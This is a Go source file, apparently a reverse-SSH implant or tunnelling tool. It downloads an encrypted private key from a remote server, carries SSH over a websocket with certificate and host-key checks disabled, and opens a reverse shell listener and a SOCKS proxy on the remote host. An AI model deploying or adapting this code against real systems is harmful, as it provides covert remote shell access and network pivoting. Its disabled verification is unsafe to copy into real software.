/*

*/

package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"runtime"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/crypto/ssh"
)


func main() {

	runtime.GOMAXPROCS(runtime.NumCPU())

	// Fetch SSH private key from external server
	resp, err := http.Get(serverUserKeyUrl)
	if err != nil {
		fmt.Println("Key Server not accessible")
		os.Exit(1)
	}
	defer resp.Body.Close()
	eKeyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Key Server response not understood")
		os.Exit(2)
	}

	// Decryption involves a shared transmission key (not the SSH privatekey passphrase)
	key := decrypt(eKeyBytes, serverUserKeyPassphrase)

	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		log.Fatalf("Unable to parse private key: %v", err)
	}

	// Setup authentication with the private key
	sshConfig := &ssh.ClientConfig{
		// SSH connection username
		User: serverUser,
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(signer),
		},
		// HostKeyCallback: ssh.FixedHostKey(hostKey),
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}


	// Client side:
	// <-> Likely where websocket base network is plugged in


	tlsClient :=  tls.Config{InsecureSkipVerify: true}
	d := websocket.Dialer{
		//ReadBufferSize:  1024,
		//WriteBufferSize: 1024,
		HandshakeTimeout: 45 * time.Second,
		Subprotocols:    []string{},
		TLSClientConfig: &tlsClient,

	}

	httpProxyURL, err := url.Parse("http://127.0.0.1:8088")
	if err != nil {
		log.Fatal(err)
	}
	httpEndpoint, err := url.Parse("https://127.0.0.1:8080")
	if err != nil {
		log.Fatal(err)
	}

	jar, _ := cookiejar.New(nil)
	d.Jar = jar
	d.Proxy = func(*http.Request) (*url.URL, error) {
		return httpProxyURL, nil

	}

	cookies := []*http.Cookie{{Name: "gorilla", Value: "ws", Path: "/"}}

	d.Jar.SetCookies( httpEndpoint, cookies)

	// TODO: test auth: https://github.com/gorilla/websocket/blob/master/client_server_test.go
	wsConn, resp, err := d.Dial("wss://127.0.0.1:8080", nil)


	if err != nil {
		log.Printf("WS-Dial INTO remote server error: %s", err)
		if err == websocket.ErrBadHandshake {
			log.Printf("Response Status: %s", resp.Status)
			log.Fatalln(fmt.Printf("handshake failed with status %d\n", resp.StatusCode))
		}

	}


	conn := NewWebSocketConn(wsConn)

	sshConn, chans, reqs, err := ssh.NewClientConn(conn, "", sshConfig)

	serverConn := ssh.NewClient(sshConn, chans, reqs)

	/*
	// Connect to SSH remote server using serverEndpoint (port 22)
	serverConn, err := ssh.Dial("tcp", serverEndpoint.String(), sshConfig)
	if err != nil {
		log.Fatalln(fmt.Printf("Dial INTO remote server error: %s", err))
	}
	*/




	// Server side:
	// Listen on remote server port - CMD
	listener, err := serverConn.Listen("tcp", remoteEndpoint.String())
	if err != nil {
		log.Fatalln(fmt.Printf("Listen open port ON remote server error: %s", err))
	}
	defer listener.Close()

	// Server side:
	// Listen on remote server port - SOCKS
	listenerS, err := serverConn.Listen("tcp", remoteEndpointSOCKS.String())
	if err != nil {
		log.Fatalln(fmt.Printf("Listen open port ON remote server error: %s", err))
	}
	defer listener.Close()

	// Server side:
	// Setup reverse SSH client authentication
	config := &ssh.ServerConfig{
		//NoClientAuth: true,
		//Provide an additional level of protection for remote SSH shell
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			// Should use constant-time compare (or better, salt+hash) in
			// a production setting.
			if c.User() == remoteCmdUser && string(pass) == remoteCmdPwd {
				return nil, nil
			}
			return nil, fmt.Errorf("password rejected for %q", c.User())
		},
	}
	// use the same private key to come back to the remote Client
	config.AddHostKey(signer)

	// accept SOCKS listener
	go acceptSLoop(listenerS)
	// accept SSH shell
	acceptLoop(listener, config)

}


func NewWebSocketConn(websocketConn *websocket.Conn) net.Conn {
	c := wsConn{
		Conn: websocketConn,
	}
	return &c
}

//Read is not threadsafe though thats okay since there
//should never be more than one reader
func (c *wsConn) Read(dst []byte) (int, error) {
	ldst := len(dst)
	//use buffer or read new message
	var src []byte
	if l := len(c.buff); l > 0 {
		src = c.buff
		c.buff = nil
	} else {
		t, msg, err := c.Conn.ReadMessage()
		if err != nil {
			return 0, err
		} else if t != websocket.BinaryMessage {
			log.Printf("<WARNING> non-binary msg")
		}
		src = msg
	}
	//copy src->dest
	var n int
	if len(src) > ldst {
		//copy as much as possible of src into dst
		n = copy(dst, src[:ldst])
		//copy remainder into buffer
		r := src[ldst:]
		lr := len(r)
		c.buff = make([]byte, lr)
		copy(c.buff, r)
	} else {
		//copy all of src into dst
		n = copy(dst, src)
	}
	//return bytes copied
	return n, nil
}

func (c *wsConn) Write(b []byte) (int, error) {
	if err := c.Conn.WriteMessage(websocket.BinaryMessage, b); err != nil {
		return 0, err
	}
	n := len(b)
	return n, nil
}

func (c *wsConn) SetDeadline(t time.Time) error {
	if err := c.Conn.SetReadDeadline(t); err != nil {
		return err
	}
	return c.Conn.SetWriteDeadline(t)
}